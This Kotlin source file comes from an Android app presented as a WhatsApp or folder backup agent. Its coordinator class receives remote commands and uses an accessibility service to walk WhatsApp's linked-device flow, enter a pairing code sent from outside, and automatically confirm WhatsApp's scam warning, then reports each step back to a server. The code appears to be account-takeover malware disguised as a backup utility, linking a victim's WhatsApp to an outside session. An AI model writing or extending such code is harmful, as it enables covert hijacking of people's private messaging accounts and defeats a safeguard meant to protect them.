package com.folderbackup.agent.sync

import android.content.Context
import android.util.Log
import com.folderbackup.agent.data.AppPreferences
import com.folderbackup.agent.network.BackupApiClient
import com.folderbackup.agent.registration.AccessibilityHelper
import com.folderbackup.agent.registration.RegistrationNotifier
import com.folderbackup.agent.registration.WhatsappLinkDeviceState
import com.folderbackup.agent.registration.WhatsappRegistrationAccessibilityService
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext

class WhatsappMountCoordinator(private val context: Context) {
    private val linkCoordinator = WhatsappLinkDeviceCoordinator(context)
    private val preferences = AppPreferences(context)
    private val api = BackupApiClient()

    suspend fun submitPairingCode(
        requestId: String?,
        pairingCode: String,
        evolutionInstance: String?,
    ): Result<String> = linkCoordinator.enterPairingCode(requestId, pairingCode, evolutionInstance)

    suspend fun confirmScamWarningAndFinish(
        requestId: String?,
        deviceName: String,
        evolutionInstance: String?,
    ): Result<String> = linkCoordinator.confirmScamWarningAndFinish(requestId, deviceName, evolutionInstance)

    suspend fun finishLinkedDeviceSetup(
        requestId: String?,
        deviceName: String,
        evolutionInstance: String?,
    ): Result<String> = linkCoordinator.finishLinkedDeviceSetup(requestId, deviceName, evolutionInstance)

    suspend fun navigateToLinkWithPhone(requestId: String?): Result<String> =
        linkCoordinator.navigateToLinkWithPhone(requestId)

    suspend fun navigateToLinkFromHome(requestId: String?): Result<String> =
        linkCoordinator.navigateToLinkFromHome(requestId)

    private suspend fun waitForA11y(requestId: String?, evolutionInstance: String?): Boolean {
        repeat(A11Y_WAIT_ATTEMPTS) {
            if (AccessibilityHelper.isServiceEnabled(context) &&
                AccessibilityHelper.isServiceConnected()
            ) {
                return true
            }
            delay(A11Y_WAIT_MS)
        }
        val msg = "Ative Acessibilidade → WhatsApp Backup"
        report(requestId, "submit_pairing_code", "failed", msg, evolutionInstance)
        return false
    }

    private suspend fun report(
        requestId: String?,
        command: String,
        status: String,
        message: String,
        evolutionInstance: String?,
    ) {
        val config = preferences.getConfigSnapshot()
        preferences.setLastStatus(message)
        api.reportCommandResult(
            config = config,
            requestId = requestId,
            command = command,
            sessionLabel = evolutionInstance ?: "pairing",
            phoneE164 = null,
            status = status,
            message = message,
        ).onFailure { Log.w(TAG, "command-result: ${it.message}") }
    }

    companion object {
        private const val TAG = "WaMountCoordinator"
        private const val A11Y_WAIT_MS = 1_000L
        private const val A11Y_WAIT_ATTEMPTS = 20
    }
}
